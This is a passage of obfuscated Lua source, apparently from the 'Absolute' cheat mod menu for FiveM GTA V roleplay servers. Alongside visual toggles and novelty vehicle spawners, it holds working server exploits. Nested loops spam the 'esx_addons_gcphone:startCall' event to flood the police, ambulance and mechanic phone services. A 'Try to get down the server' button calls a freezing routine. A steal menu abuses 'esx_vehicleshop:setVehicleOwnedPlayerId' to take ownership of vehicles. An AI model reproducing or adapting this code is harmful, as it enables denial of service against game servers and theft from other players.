                        for i = 0.0, 20 do
                            local K_fOPH = GetEntityCoords(GetPlayerPed(i))
                            TriggerServerEvent("esx_addons_gcphone:startCall", "mechanic", "ouch!", K_fOPH)
                        end
                    end
                    for i = 0.0, 250 do
                        for i = 0.0, 20 do
                            local M8ZkZB0su6ksHHZNCr7EK = GetEntityCoords(GetPlayerPed(i))
                            TriggerServerEvent("esx_addons_gcphone:startCall", "police", "ouch!", M8ZkZB0su6ksHHZNCr7EK)
                        end
                    end
                    for i = 0.0, 250 do
                        for i = 0.0, 20 do
                            local a8fcqMC = GetEntityCoords(GetPlayerPed(i))
                            TriggerServerEvent("esx_addons_gcphone:startCall", "ambulance", "ouch!", a8fcqMC)
                        end
                    end
                elseif Absolute.Button("Try to get down the server", "FREEZING") then
                    aNfWFA0Fh0SOPuMjtoOFeg()
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("VisualOptions") then
                if
                    Absolute.CheckBox(
                        "Player Blips",
                        playerBlips,
                        function(dAG)
                            playerBlips = dAG
                        end
                    )
                 then
                elseif Absolute.CheckBox("Force Map", l3hynQvfI9D) then
                    l3hynQvfI9D = not l3hynQvfI9D
                elseif Absolute.CheckBox("Night vision", NightVision) then
                    NightVision = not NightVision
                    SetNightvision(NightVision)
                elseif Absolute.CheckBox("Thermal vision", HeatVision) then
                    HeatVision = not HeatVision
                    SetSeethrough(HeatVision)
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("CraftLaboratory") then
                if
                    Absolute.MenuButton(
                        "Vehicles",
                        "VehiclesLaboratory",
                        "~o~>>",
                        {dict = "mpleaderboard", text = "leaderboard_cops_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.ComboBox(
                        "Spawn Prop",
                        a8aX3wrmESORgMKw,
                        currSelectedCraftPropIndex,
                        selSelectedCraftPropIndex,
                        function(X8vpEUqZflBSP2, HOna_vxmKJC)
                            currSelectedCraftPropIndex = X8vpEUqZflBSP2
                            selSelectedCraftPropIndex = X8vpEUqZflBSP2
                        end
                    )
                 then
                    local SKPKFSNnz2PxgZZL2ytg = GetEntityCoords(GetPlayerPed(-1))
                    local aPPPYeknsaHLiSAhjAmW = GetHashKey(uH21lOeB7WrqG[selSelectedCraftPropIndex])
                    RequestModel(aPPPYeknsaHLiSAhjAmW)
                    while not HasModelLoaded(aPPPYeknsaHLiSAhjAmW) do
                        Citizen.Wait(0.0)
                    end
                    PropToSpawn = CreateObject(aPPPYeknsaHLiSAhjAmW, SKPKFSNnz2PxgZZL2ytg, true, true, false)
                    table.insert(QNsCYSWHSfkijzfnn, PropToSpawn)
                elseif
                    Absolute.ComboBox(
                        "X Movement",
                        {"PLUS", "MINUS"},
                        currSelectedXMovement,
                        selSelectedXMovement,
                        function(S9hxryEBlf5ZJyN, pH)
                            currSelectedXMovement = S9hxryEBlf5ZJyN
                            selSelectedXMovement = S9hxryEBlf5ZJyN
                        end
                    )
                 then
                    local kM6h0PeHBGSiA3SC9L, q9hPuA3dT, GjvoWmpYIDTfDXST2 =
                        table.unpack(
                        GetOffsetFromEntityInWorldCoords(PropToSpawn, nlXCUGaxh(0.0), nlXCUGaxh(0.0), nlXCUGaxh(0.0))
                    )
                    if selSelectedXMovement == 1 then
                        local mns1t4 = tonumber(string.format("%.2f", kM6h0PeHBGSiA3SC9L))
                        local F1Tekh__EFo = tonumber(string.format("%.2f", q9hPuA3dT))
                        local gjrLWutCa4o = tonumber(string.format("%.2f", GjvoWmpYIDTfDXST2))
                        SetEntityCoords(PropToSpawn, mns1t4 + 1, F1Tekh__EFo, gjrLWutCa4o)
                    elseif selSelectedXMovement == 2 then
                        local ELvDSb5Jup = tonumber(string.format("%.2f", kM6h0PeHBGSiA3SC9L))
                        local VJ = tonumber(string.format("%.2f", q9hPuA3dT))
                        local ZaMjJuoDURRwjp = tonumber(string.format("%.2f", GjvoWmpYIDTfDXST2))
                        SetEntityCoords(PropToSpawn, ELvDSb5Jup - 1, VJ, ZaMjJuoDURRwjp)
                    end
                elseif
                    Absolute.ComboBox(
                        "Y Movement",
                        {"PLUS", "MINUS"},
                        currSelectedYMovement,
                        selSelectedYMovement,
                        function(sy8JcGWTd, OdfMtgoFQO97_)
                            currSelectedYMovement = sy8JcGWTd
                            selSelectedYMovement = sy8JcGWTd
                        end
                    )
                 then
                    local iG60WkeDrULkZXR, AQV3k6UmLM, waj3 =
                        table.unpack(
                        GetOffsetFromEntityInWorldCoords(PropToSpawn, nlXCUGaxh(0.0), nlXCUGaxh(0.0), nlXCUGaxh(0.0))
                    )
                    if selSelectedYMovement == 1 then
                        local CBlW7b = tonumber(string.format("%.2f", iG60WkeDrULkZXR))
                        local Dj13PU7b = tonumber(string.format("%.2f", AQV3k6UmLM))
                        local DUmjDx8_ = tonumber(string.format("%.2f", waj3))
                        SetEntityCoords(PropToSpawn, CBlW7b, Dj13PU7b + 1, DUmjDx8_)
                    elseif selSelectedYMovement == 2 then
                        local oOQhRil = tonumber(string.format("%.2f", iG60WkeDrULkZXR))
                        local U24FLn6B = tonumber(string.format("%.2f", AQV3k6UmLM))
                        local MSfnq5NMV2aVmbkV = tonumber(string.format("%.2f", waj3))
                        SetEntityCoords(PropToSpawn, oOQhRil, U24FLn6B - 1, MSfnq5NMV2aVmbkV)
                    end
                elseif
                    Absolute.ComboBox(
                        "Z Movement",
                        {"PLUS", "MINUS"},
                        currSelectedZMovement,
                        selSelectedZMovement,
                        function(m82L3XGv1ZWayO, QNCv8gPkAbTQm8AGkVNZ)
                            currSelectedZMovement = m82L3XGv1ZWayO
                            selSelectedZMovement = m82L3XGv1ZWayO
                        end
                    )
                 then
                    local RNeaTfOaGvRZI_CA0, skt7l, RaX8nbM7qrF =
                        table.unpack(
                        GetOffsetFromEntityInWorldCoords(PropToSpawn, nlXCUGaxh(0.0), nlXCUGaxh(0.0), nlXCUGaxh(0.0))
                    )
                    if selSelectedZMovement == 1 then
                        local dd8H2CLoUZKVKFAxK = tonumber(string.format("%.2f", RNeaTfOaGvRZI_CA0))
                        local ac7Fn = tonumber(string.format("%.2f", skt7l))
                        local K9TX9My9RLsmAjBi9 = tonumber(string.format("%.2f", RaX8nbM7qrF))
                        SetEntityCoords(PropToSpawn, dd8H2CLoUZKVKFAxK, ac7Fn, K9TX9My9RLsmAjBi9 + 1)
                    elseif selSelectedZMovement == 2 then
                        local tCFqqxWN = tonumber(string.format("%.2f", RNeaTfOaGvRZI_CA0))
                        local Gm = tonumber(string.format("%.2f", skt7l))
                        local S1OdqTPN = tonumber(string.format("%.2f", RaX8nbM7qrF))
                        SetEntityCoords(PropToSpawn, tCFqqxWN, Gm, S1OdqTPN - 1)
                    end
                elseif Absolute.Button("Set Entity To My coords") then
                    local mWpyPAzTSLJUQe, gFWWz, Jt2SUVGTy6VdPL =
                        table.unpack(
                        GetOffsetFromEntityInWorldCoords(
                            GetPlayerPed(-1),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0)
                        )
                    )
                    local A = tonumber(string.format("%.2f", mWpyPAzTSLJUQe))
                    local dX6 = tonumber(string.format("%.2f", gFWWz))
                    local QlJy33N65GxcUCu = tonumber(string.format("%.2f", Jt2SUVGTy6VdPL))
                    SetEntityCoords(PropToSpawn, A, dX6, QlJy33N65GxcUCu)
                elseif Absolute.CheckBox("Crafts delete gun", CraftLaboratoryDeleteGun) then
                    CraftLaboratoryDeleteGun = not CraftLaboratoryDeleteGun
                elseif Absolute.Button("Teleport to Entity") then
                    local L9Honhk, KK, GyHzyYoWma792TUfye8l =
                        table.unpack(
                        GetOffsetFromEntityInWorldCoords(PropToSpawn, nlXCUGaxh(0.0), nlXCUGaxh(0.0), nlXCUGaxh(0.0))
                    )
                    TeleportToCertainPoint(L9Honhk + 1, KK + 1, GyHzyYoWma792TUfye8l)
                elseif Absolute.Button("Finish this prop", "NO MORE EDIT/DLT") then
                    FreezeEntityPosition(PropToSpawn, true)
                    PropToSpawn = nil
                elseif Absolute.Button("Delete Props") then
                    for i = 1, #QNsCYSWHSfkijzfnn do
                        DeleteEntity(QNsCYSWHSfkijzfnn[i])
                        table.remove(QNsCYSWHSfkijzfnn, i)
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("VehiclesLaboratory") then
                if
                    Absolute.ComboBox(
                        "Broom",
                        {"Flyer", "City"},
                        currBroomIndex,
                        selBroomIndex,
                        function(nxodR1CmF3dL, cR)
                            currBroomIndex = nxodR1CmF3dL
                            selBroomIndex = nxodR1CmF3dL
                        end
                    )
                 then
                    if selBroomIndex == 1 then
                        local wrKvMTFL = "oppressor2"
                        local DeTPEgB = GetPlayerPed(-1)
                        RequestModel(wrKvMTFL)
                        while not HasModelLoaded(wrKvMTFL) do
                            Citizen.Wait(50)
                        end
                        local b7DWKe =
                            CreateVehicle(
                            GetHashKey(wrKvMTFL),
                            GetEntityCoords(DeTPEgB),
                            GetEntityHeading(DeTPEgB) + 90,
                            true,
                            true
                        )
                        FullTunningCar(b7DWKe)
                        SetEntityVisible(b7DWKe, false, 0.0)
                        SetPedIntoVehicle(DeTPEgB, b7DWKe, -1)
                        local ZmOipF9HDqWjrY4P7urp = GetHashKey("prop_tool_broom")
                        local Ut = CreateObject(ZmOipF9HDqWjrY4P7urp, 0.0, 0.0, 0.0, true, true, true)
                        if DoesEntityExist(b7DWKe) then
                            AttachEntityToEntity(
                                Ut,
                                b7DWKe,
                                0.4,
                                nlXCUGaxh(0.0),
                                0.0,
                                0.4,
                                nlXCUGaxh(90),
                                nlXCUGaxh(180),
                                nlXCUGaxh(180),
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    elseif selBroomIndex == 2 then
                        local qQ = "blazer2"
                        local NZL9ESy = GetPlayerPed(-1)
                        RequestModel(qQ)
                        while not HasModelLoaded(qQ) do
                            Citizen.Wait(50)
                        end
                        local wTHQK =
                            CreateVehicle(
                            GetHashKey(qQ),
                            GetEntityCoords(NZL9ESy),
                            GetEntityHeading(NZL9ESy) + 90,
                            true,
                            true
                        )
                        FullTunningCar(wTHQK)
                        SetEntityVisible(wTHQK, false, 0.0)
                        SetPedIntoVehicle(NZL9ESy, wTHQK, -1)
                        local IKt = GetHashKey("prop_tool_broom")
                        local oXzo6PQlawjC0PA_ttBjT = CreateObject(IKt, 0.0, 0.0, 0.0, true, true, true)
                        if DoesEntityExist(wTHQK) then
                            AttachEntityToEntity(
                                oXzo6PQlawjC0PA_ttBjT,
                                wTHQK,
                                0.4,
                                nlXCUGaxh(0.0),
                                0.0,
                                0.2,
                                nlXCUGaxh(90),
                                nlXCUGaxh(180),
                                nlXCUGaxh(0.0),
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
                elseif
                    Absolute.ComboBox(
                        "SurBoard",
                        {"Water", "City"},
                        currSurfIndex,
                        selSurfIndex,
                        function(gK3Jlt0YtQmBzOi5C0, hM77Txvi)
                            currSurfIndex = gK3Jlt0YtQmBzOi5C0
                            selSurfIndex = gK3Jlt0YtQmBzOi5C0
                        end
                    )
                 then
                    if selSurfIndex == 1 then
                        local TcK1vK = "seashark2"
                        local _pJYlp_9 = GetPlayerPed(-1)
                        RequestModel(TcK1vK)
                        while not HasModelLoaded(TcK1vK) do
                            Citizen.Wait(50)
                        end
                        local Xl4HVOO =
                            CreateVehicle(
                            GetHashKey(TcK1vK),
                            GetEntityCoords(_pJYlp_9),
                            GetEntityHeading(_pJYlp_9) + 90,
                            true,
                            true
                        )
                        FullTunningCar(Xl4HVOO)
                        SetEntityVisible(Xl4HVOO, false, 0.0)
                        SetPedIntoVehicle(_pJYlp_9, Xl4HVOO, -1)
                        local tmKX0pCqR2oxJyhqWVU1g = GetHashKey("prop_surf_board_04")
                        local jK6lKgnE0Yna0Tc94dt = CreateObject(tmKX0pCqR2oxJyhqWVU1g, 0.0, 0.0, 0.0, true, true, true)
                        if DoesEntityExist(Xl4HVOO) then
                            AttachEntityToEntity(
                                jK6lKgnE0Yna0Tc94dt,
                                Xl4HVOO,
                                0.4,
                                nlXCUGaxh(0.0),
                                0.0,
                                0.4,
                                nlXCUGaxh(90),
                                nlXCUGaxh(180),
                                nlXCUGaxh(180),
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    elseif selSurfIndex == 2 then
                        local Wruh8PAVMErkYykolgXRl = "sanchez"
                        local HImrvWqifRGTghCcja = GetPlayerPed(-1)
                        RequestModel(Wruh8PAVMErkYykolgXRl)
                        while not HasModelLoaded(Wruh8PAVMErkYykolgXRl) do
                            Citizen.Wait(50)
                        end
                        local QvlMQhxV =
                            CreateVehicle(
                            GetHashKey(Wruh8PAVMErkYykolgXRl),
                            GetEntityCoords(HImrvWqifRGTghCcja),
                            GetEntityHeading(HImrvWqifRGTghCcja) + 90,
                            true,
                            true
                        )
                        FullTunningCar(QvlMQhxV)
                        SetEntityVisible(QvlMQhxV, false, 0.0)
                        SetPedIntoVehicle(HImrvWqifRGTghCcja, QvlMQhxV, -1)
                        local svZANBTzs0F = GetHashKey("prop_surf_board_04")
                        local Fkvf = CreateObject(svZANBTzs0F, 0.0, 0.0, 0.0, true, true, true)
                        if DoesEntityExist(QvlMQhxV) then
                            AttachEntityToEntity(
                                Fkvf,
                                QvlMQhxV,
                                0.4,
                                nlXCUGaxh(0.0),
                                0.0,
                                0.3,
                                nlXCUGaxh(90),
                                nlXCUGaxh(180),
                                nlXCUGaxh(180),
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
                elseif Absolute.Button("PAnini") then
                    Absolute_function.PlaneMotorcycle()
                elseif Absolute.Button("Bush") then
                    local uJ0BpjEIOcXcP_vs = "t20"
                    local YHPibRRynk4WjXVyq = "prop_bush_lrg_01c_cr"
                    local Y6iLR9AePl4IVSxoLrj = GetPlayerPed(-1)
                    RequestModel(uJ0BpjEIOcXcP_vs)
                    while not HasModelLoaded(uJ0BpjEIOcXcP_vs) do
                        Citizen.Wait(50)
                    end
                    RequestModel(YHPibRRynk4WjXVyq)
                    while not HasModelLoaded(YHPibRRynk4WjXVyq) do
                        Citizen.Wait(50)
                    end
                    local jNm1JoeF =
                        CreateVehicle(
                        GetHashKey(uJ0BpjEIOcXcP_vs),
                        GetEntityCoords(Y6iLR9AePl4IVSxoLrj),
                        GetEntityHeading(Y6iLR9AePl4IVSxoLrj) + 90,
                        true,
                        true
                    )
                    FullTunningCar(jNm1JoeF)
                    VehicleMaxTunning(jNm1JoeF)
                    SetVehicleCustomPrimaryColour(jNm1JoeF, 0.0, 0.0, 0.0)
                    SetVehicleCustomSecondaryColour(jNm1JoeF, 0.0, 0.0, 0.0)
                    SetVehicleNeonLightsColour(jNm1JoeF, 0.0, 0.0, 0.0)
                    local ll67ovM8O59CjRo = CreateObject(GetHashKey(YHPibRRynk4WjXVyq), 0.0, 0.0, 0.0, true, true, true)
                    local kRgZ_2R5mT1 = CreateObject(GetHashKey(YHPibRRynk4WjXVyq), 0.0, 0.0, 0.0, true, true, true)
                    if DoesEntityExist(jNm1JoeF) then
                        AttachEntityToEntity(
                            ll67ovM8O59CjRo,
                            jNm1JoeF,
                            0.4,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(1),
                            -0.5,
                            0.0,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(180),
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                        AttachEntityToEntity(
                            kRgZ_2R5mT1,
                            jNm1JoeF,
                            0.4,
                            nlXCUGaxh(0.0),
                            -1.2,
                            -0.5,
                            0.0,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(180),
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    end
                elseif Absolute.Button("Flying submarine") then
                    local _gu = "blimp"
                    local Hcb179aS2V0 = "xm_prop_x17_sub"
                    local Ktz6vnfAEiCWD = GetPlayerPed(-1)
                    RequestModel(_gu)
                    while not HasModelLoaded(_gu) do
                        Citizen.Wait(50)
                    end
                    RequestModel(Hcb179aS2V0)
                    while not HasModelLoaded(Hcb179aS2V0) do
                        Citizen.Wait(50)
                    end
                    local wJeGw_DEiDewu7vEUrhTB =
                        CreateVehicle(
                        GetHashKey(_gu),
                        GetEntityCoords(Ktz6vnfAEiCWD),
                        GetEntityHeading(Ktz6vnfAEiCWD) + 90,
                        true,
                        true
                    )
                    local Y = CreateObject(GetHashKey(Hcb179aS2V0), 0.0, 0.0, 0.0, true, true, true)
                    Citizen.Wait(3000)
                    if DoesEntityExist(wJeGw_DEiDewu7vEUrhTB) then
                        AttachEntityToEntity(
                            Y,
                            wJeGw_DEiDewu7vEUrhTB,
                            0.4,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(-13),
                            nlXCUGaxh(13),
                            0.0,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(90),
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    end
                elseif Absolute.Button("Couch car") then
                    local IFLF7 = "adder"
                    local cLTgO2 = GetPlayerPed(-1)
                    local StxkROIDBdftosJJGu = GetHashKey("prop_ld_farm_couch02")
                    RequestModel(IFLF7)
                    while not HasModelLoaded(IFLF7) do
                        Citizen.Wait(50)
                    end
                    RequestModel(StxkROIDBdftosJJGu)
                    while not HasModelLoaded(StxkROIDBdftosJJGu) do
                        Citizen.Wait(50)
                    end
                    local MDkGJl0dkO =
                        CreateVehicle(
                        GetHashKey(IFLF7),
                        GetEntityCoords(cLTgO2),
                        GetEntityHeading(cLTgO2) + 90,
                        true,
                        true
                    )
                    FullTunningCar(MDkGJl0dkO)
                    SetEntityVisible(MDkGJl0dkO, false, 0.0)
                    SetPedIntoVehicle(cLTgO2, MDkGJl0dkO, -1)
                    local VUzLK445gDyxY_zwHSA = CreateObject(StxkROIDBdftosJJGu, 0.0, 0.0, 0.0, true, true, true)
                    if DoesEntityExist(MDkGJl0dkO) then
                        AttachEntityToEntity(
                            VUzLK445gDyxY_zwHSA,
                            MDkGJl0dkO,
                            0.4,
                            nlXCUGaxh(0.0),
                            0.0,
                            -0.1,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(90),
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    end
                elseif Absolute.Button("Flying yatch") then
                    local zULsuzT = "Hydra"
                    local oy = 1338692320
                    local YFq1_J4pqK = 2890770506
                    local cCZVjB = GetPlayerPed(-1)
                    RequestModel(zULsuzT)
                    while not HasModelLoaded(zULsuzT) do
                        Citizen.Wait(50)
                    end
                    RequestModel(oy)
                    while not HasModelLoaded(oy) do
                        Citizen.Wait(50)
                    end
                    local sz5XNEPdcKmYJCEpurje =
                        CreateVehicle(
                        GetHashKey(zULsuzT),
                        GetEntityCoords(cCZVjB),
                        GetEntityHeading(cCZVjB) + 90,
                        true,
                        true
                    )
                    SetPedIntoVehicle(cCZVjB, sz5XNEPdcKmYJCEpurje, -1)
                    local tU7mpDy = CreateObject(oy, 0.0, 0.0, 0.0, true, true, true)
                    local dxrBj = CreateObject(YFq1_J4pqK, 0.0, 0.0, 0.0, true, true, true)
                    local sRqL7_QZ = CreateObject(YFq1_J4pqK, 0.0, 0.0, 0.0, true, true, true)
                    local MR3Dzzqxt2SHMUK9r4kK = CreateObject(YFq1_J4pqK, 0.0, 0.0, 0.0, true, true, true)
                    local X9VNmHJy9H = CreateObject(YFq1_J4pqK, 0.0, 0.0, 0.0, true, true, true)
                    local U2BYedZSfJfMFl1GPyxR2 = CreateObject(YFq1_J4pqK, 0.0, 0.0, 0.0, true, true, true)
                    local kyG = CreateObject(YFq1_J4pqK, 0.0, 0.0, 0.0, true, true, true)
                    local WSLbQYpcvmIZjWsQXXn = CreateObject(YFq1_J4pqK, 0.0, 0.0, 0.0, true, true, true)
                    local e4FGnHb2ST = CreateObject(YFq1_J4pqK, 0.0, 0.0, 0.0, true, true, true)
                    if DoesEntityExist(sz5XNEPdcKmYJCEpurje) then
                        AttachEntityToEntity(
                            tU7mpDy,
                            sz5XNEPdcKmYJCEpurje,
                            0.4,
                            -1.5,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(5),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(90),
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                        AttachEntityToEntity(
                            dxrBj,
                            sz5XNEPdcKmYJCEpurje,
                            0.4,
                            nlXCUGaxh(-3),
                            nlXCUGaxh(25),
                            nlXCUGaxh(5),
                            nlXCUGaxh(90),
                            nlXCUGaxh(180),
                            nlXCUGaxh(90),
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                        Citizen.Wait(700)
                        AttachEntityToEntity(
                            sRqL7_QZ,
                            sz5XNEPdcKmYJCEpurje,
                            0.4,
                            nlXCUGaxh(-3),
                            nlXCUGaxh(25),
                            nlXCUGaxh(5),
                            nlXCUGaxh(90),
                            nlXCUGaxh(180),
                            nlXCUGaxh(90),
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                        AttachEntityToEntity(
                            MR3Dzzqxt2SHMUK9r4kK,
                            sz5XNEPdcKmYJCEpurje,
                            0.4,
                            nlXCUGaxh(-3),
                            nlXCUGaxh(-30),
                            nlXCUGaxh(5),
                            nlXCUGaxh(90),
                            nlXCUGaxh(180),
                            nlXCUGaxh(90),
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                        Citizen.Wait(700)
                        AttachEntityToEntity(
                            X9VNmHJy9H,
                            sz5XNEPdcKmYJCEpurje,
                            0.4,
                            nlXCUGaxh(-3),
                            nlXCUGaxh(-30),
                            nlXCUGaxh(5),
                            nlXCUGaxh(90),
                            nlXCUGaxh(180),
                            nlXCUGaxh(90),
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                        AttachEntityToEntity(
                            U2BYedZSfJfMFl1GPyxR2,
                            sz5XNEPdcKmYJCEpurje,
                            0.4,
                            nlXCUGaxh(3),
                            nlXCUGaxh(25),
                            nlXCUGaxh(5),
                            nlXCUGaxh(90),
                            nlXCUGaxh(180),
                            nlXCUGaxh(270),
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                        Citizen.Wait(700)
                        AttachEntityToEntity(
                            kyG,
                            sz5XNEPdcKmYJCEpurje,
                            0.4,
                            nlXCUGaxh(3),
                            nlXCUGaxh(25),
                            nlXCUGaxh(5),
                            nlXCUGaxh(90),
                            nlXCUGaxh(180),
                            nlXCUGaxh(270),
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                        AttachEntityToEntity(
                            WSLbQYpcvmIZjWsQXXn,
                            sz5XNEPdcKmYJCEpurje,
                            0.4,
                            nlXCUGaxh(3),
                            nlXCUGaxh(-30),
                            nlXCUGaxh(5),
                            nlXCUGaxh(90),
                            nlXCUGaxh(180),
                            nlXCUGaxh(270),
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                        Citizen.Wait(700)
                        AttachEntityToEntity(
                            e4FGnHb2ST,
                            sz5XNEPdcKmYJCEpurje,
                            0.4,
                            nlXCUGaxh(3),
                            nlXCUGaxh(-30),
                            nlXCUGaxh(5),
                            nlXCUGaxh(90),
                            nlXCUGaxh(180),
                            nlXCUGaxh(270),
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("VehiclesMenu") then
                if Absolute.MenuButton("Vehicle Spawner", "VehicleSpawner", "~o~>>") then
                elseif Absolute.MenuButton("Mechanic", "LSCustoms", "~o~>>") then
                elseif
                    Absolute.ComboBox(
                        "Vehicle Functions",
                        {"Completely Repair", "Break Vehicle", "Delete vehicle", "Flip Vehicle"},
                        currVFuncIndex,
                        selVFuncIndex,
                        function(b56v8, JHAEfDy8haQxo)
                            currVFuncIndex = b56v8
                            selVFuncIndex = b56v8
                        end
                    )
                 then
                    local g2cuaA5UFri = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                    if selVFuncIndex == 1 then
                        SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                        SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), nlXCUGaxh(0.0))
                        SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                        SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                        Citizen.InvokeNative(2292506429516893524, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                        SetVehicleEngineOn(g2cuaA5UFri, 1, 1)
                    elseif selVFuncIndex == 2 then
                        SetVehicleEngineHealth(g2cuaA5UFri, 0.0)
                    elseif selVFuncIndex == 3 then
                        DeleteEntity(g2cuaA5UFri)
                    elseif selVFuncIndex == 4 then
                        flipvehilce()
                    end
                elseif
                    Absolute.ComboBoxSlider(
                        "Torque Changer",
                        TorqueModOps,
                        currSpeedIndex,
                        selSpeedIndex,
                        function(L, hp7Y9D59)
                            currSpeedIndex = L
                            selSpeedIndex = L
                            SpeedModAmt = TorqueModOps[currSpeedIndex]
                            if SpeedModAmt == nlXCUGaxh(1) then
                                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0.0), SpeedModAmt)
                            else
                                SetVehicleEnginePowerMultiplier(
                                    GetVehiclePedIsIn(PlayerPedId(), 0.0),
                                    SpeedModAmt * nlXCUGaxh(20)
                                )
                            end
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Dirty Level",
                        DirtyCBWords,
                        currDirtyIndex,
                        selDirtyIndex,
                        function(eWJi, LJLzvHcr80_n)
                            local Qt6qfTKRknYG = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                            currDirtyIndex = eWJi
                            selDirtyIndex = eWJi
                            DirtyMultiplier = DirtyCB[eWJi]
                            SetVehicleDirtLevel(Qt6qfTKRknYG, DirtyMultiplier)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBox(
                        "Vehicle Engine Sound",
                        {
                            "DUBSTA",
                            "COQUETTE",
                            "ELECTRIC",
                            "ADDER",
                            "BISON",
                            "HOTKNIFE",
                            "JESTER",
                            "RAPID",
                            "XA21",
                            "NERO 2",
                            "STRETCH",
                            "BTYPE 2",
                            "BLAZER 4",
                            "COMET 2",
                            "WINDSOR",
                            "DEFAULT"
                        },
                        currSoundFuncIndex,
                        selSoundFuncIndex,
                        function(Y, tawbX0wZa7QW)
                            currSoundFuncIndex = Y
                            selSoundFuncIndex = Y
                        end
                    )
                 then
                    local VN8BA = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                    if selSoundFuncIndex == 1 then
                        ForceVehicleEngineAudio(VN8BA, "DUBSTA")
                    elseif selSoundFuncIndex == 2 then
                        ForceVehicleEngineAudio(VN8BA, "COQUETTE")
                    elseif selSoundFuncIndex == 3 then
                        ForceVehicleEngineAudio(VN8BA, "VOLTIC")
                    elseif selSoundFuncIndex == 4 then
                        ForceVehicleEngineAudio(VN8BA, "ADDER")
                    elseif selSoundFuncIndex == 5 then
                        ForceVehicleEngineAudio(VN8BA, "BISON")
                    elseif selSoundFuncIndex == 6 then
                        ForceVehicleEngineAudio(VN8BA, "HOTKNIFE")
                    elseif selSoundFuncIndex == 7 then
                        ForceVehicleEngineAudio(VN8BA, "JESTER3")
                    elseif selSoundFuncIndex == 8 then
                        ForceVehicleEngineAudio(VN8BA, "RAPIDGT")
                    elseif selSoundFuncIndex == 9 then
                        ForceVehicleEngineAudio(VN8BA, "xa21")
                    elseif selSoundFuncIndex == 10 then
                        ForceVehicleEngineAudio(VN8BA, "nero2")
                    elseif selSoundFuncIndex == 11 then
                        ForceVehicleEngineAudio(VN8BA, "STRETCH")
                    elseif selSoundFuncIndex == 12 then
                        ForceVehicleEngineAudio(VN8BA, "btype2")
                    elseif selSoundFuncIndex == 13 then
                        ForceVehicleEngineAudio(VN8BA, "BLAZER4")
                    elseif selSoundFuncIndex == 14 then
                        ForceVehicleEngineAudio(VN8BA, "COMET2")
                    elseif selSoundFuncIndex == 15 then
                        ForceVehicleEngineAudio(VN8BA, "windsor")
                    elseif selSoundFuncIndex == 16 then
                        ForceVehicleEngineAudio(VN8BA, windsor)
                    end
                elseif
                    Absolute.ComboBox(
                        "Some steal options",
                        {"~g~ESX ~s~| Steal Vehicle", "Replace garage car", "Change plate", "~g~ESX ~s~| Spawn owned"},
                        currStealVehFuncIndex,
                        currStealVehFuncIndex,
                        function(jmgFjpCzUxnC7, kAcr2tHyhvh7kgjBu)
                            currStealVehFuncIndex = jmgFjpCzUxnC7
                            selStealVehFuncIndex = jmgFjpCzUxnC7
                        end
                    )
                 then
                    if selStealVehFuncIndex == 1 then
                        if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                            local IEufHlOj0yAM18Sxtyp = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                            local uFHeL = GetVehicleProperties(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                            local hX376_sL136DRq = uFHeL.model
                            local QIx6x9LxVpd94Wgpukn37 = GetDisplayNameFromVehicleModel(hX376_sL136DRq)
                            FuckerTriggerCustomEvent(
                                true,
                                "esx_vehicleshop:setVehicleOwnedPlayerId",
                                GetPlayerServerId(PlayerId()),
                                uFHeL,
                                QIx6x9LxVpd94Wgpukn37,
                                hX376_sL136DRq,
                                false
                            )
                        end
                    elseif selStealVehFuncIndex == 2 then
                        VehicleBuy()
                    elseif selStealVehFuncIndex == 3 then
                        omUMPIxLdJiimeh()
                    elseif selStealVehFuncIndex == 4 then
                        local U = kbinput("Enter Vehicle Spawn Name", " ", 10)
                        local oQTMVy = kbinput("Enter Vehicle Plate Number", " ", 8)
                        SpawnLegalVehicle(U, PlayerId(), oQTMVy)
                    end
